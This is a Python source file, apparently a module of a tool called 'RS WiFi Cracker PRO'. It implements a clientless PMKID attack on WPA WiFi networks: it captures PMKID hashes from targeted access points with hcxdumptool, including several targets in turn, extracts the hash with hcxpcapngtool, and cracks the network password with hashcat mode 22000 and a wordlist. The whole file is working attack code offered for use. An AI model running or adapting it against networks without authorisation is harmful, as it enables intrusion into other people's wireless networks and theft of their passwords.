#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - PMKID Attack Module"""
import os
import time
import subprocess
from typing import Optional, List
from datetime import datetime


class PMKIDAttacker:
    """PMKID (clientless) attack module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.capture_dir = "/tmp/rs-wifi-captures/pmkid"
        os.makedirs(self.capture_dir, exist_ok=True)
    
    def capture(self, bssid: str, channel: int = None, 
                timeout: int = 60) -> Optional[str]:
        """Capture PMKID from AP"""
        self.logger.info(f"Attempting PMKID capture for {bssid}...")
        
        output_file = os.path.join(self.capture_dir, f"{bssid.replace(':', '')}")
        
        # Set channel if provided
        if channel:
            subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)],
                          capture_output=True)
        
        try:
            # Create filter file
            filter_file = output_file + '.filter'
            with open(filter_file, 'w') as f:
                f.write(bssid + '\n')
            
            # Run hcxdumptool
            cmd = [
                'hcxdumptool', '-i', self.interface,
                '-o', output_file + '.pcapng',
                '--enable_status=1',
                '--filterlist_ap=' + filter_file,
                '--filtermode=2'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            start_time = time.time()
            while time.time() - start_time < timeout:
                time.sleep(5)
                
                if os.path.exists(output_file + '.pcapng'):
                    # Check for PMKID
                    if self._extract_pmkid(output_file + '.pcapng', bssid):
                        process.terminate()
                        self.logger.success("PMKID captured!")
                        return output_file + '.hash'
            
            process.terminate()
            
        except FileNotFoundError:
            self.logger.error("hcxdumptool not found")
        except Exception as e:
            self.logger.error(f"PMKID capture failed: {e}")
        
        return None
    
    def _extract_pmkid(self, pcapng_file: str, bssid: str) -> bool:
        """Extract PMKID hash from pcapng"""
        hash_file = pcapng_file.replace('.pcapng', '.hash')
        
        try:
            result = subprocess.run([
                'hcxpcapngtool', '-o', hash_file, pcapng_file
            ], capture_output=True, text=True)
            
            if os.path.exists(hash_file):
                with open(hash_file, 'r') as f:
                    content = f.read()
                    if bssid.lower() in content.lower():
                        return True
        except:
            pass
        
        return False
    
    def capture_multiple(self, bssids: List[str], timeout: int = 120) -> dict:
        """Capture PMKID from multiple APs"""
        results = {}
        
        for bssid in bssids:
            self.logger.info(f"Targeting {bssid}...")
            hash_file = self.capture(bssid, timeout=timeout // len(bssids))
            results[bssid] = hash_file
        
        return results
    
    def crack(self, hash_file: str, wordlist: str) -> Optional[str]:
        """Crack PMKID hash"""
        self.logger.info("Cracking PMKID hash...")
        
        try:
            # Use hashcat mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
            result = subprocess.run([
                'hashcat', '-m', '22000', hash_file, wordlist, '--force'
            ], capture_output=True, text=True, timeout=3600)
            
            # Show result
            show = subprocess.run([
                'hashcat', '-m', '22000', hash_file, '--show'
            ], capture_output=True, text=True)
            
            if ':' in show.stdout:
                parts = show.stdout.strip().split(':')
                if len(parts) >= 2:
                    password = parts[-1].strip()
                    self.logger.success(f"Password: {password}")
                    return password
                    
        except Exception as e:
            self.logger.error(f"PMKID crack failed: {e}")
        
        return None
